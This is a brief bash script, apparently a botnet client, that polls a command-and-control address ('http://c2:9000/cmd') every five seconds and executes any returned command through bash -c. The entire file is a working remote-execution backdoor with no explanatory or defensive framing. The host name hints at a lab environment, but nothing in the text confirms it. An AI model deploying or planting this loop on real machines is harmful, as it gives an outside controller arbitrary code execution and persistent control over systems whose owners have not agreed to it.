#!/bin/bash

C2_URL="http://c2:9000/cmd"

while true; do
    CMD=$(curl -s $C2_URL)
    if [ "$CMD" != "idle" ] && [ ! -z "$CMD" ]; then
        echo "[BOT] Executing: $CMD"
        bash -c "$CMD"
    fi
    sleep 5
done
